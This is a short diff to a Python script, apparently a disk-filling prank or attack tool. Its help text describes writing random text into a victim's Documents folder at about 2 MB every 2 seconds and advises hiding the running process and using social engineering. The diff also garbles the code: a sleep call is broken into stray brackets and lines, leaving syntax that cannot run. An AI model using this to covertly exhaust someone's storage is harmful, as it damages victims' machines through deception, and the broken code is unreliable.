@@ -77,8 +77,10 @@ def help():
     if it was to be in documents on their computer it would make a file on documents and fill it with random text normally about 2mb per 2 seconds.
     Meaning in a minute you have drained 120mb leave it on for 10 min that's 1.2gb you get what Im getting at.
     Be wary with python they will be able to see that it is running at the bottom as a tab so be wary of that you may need to use a little
-    social engineering""")
-    time.sleep(20)
+    social engine""")
+    time.sleep      ]
+    ]
+    0)
     main()
 
 
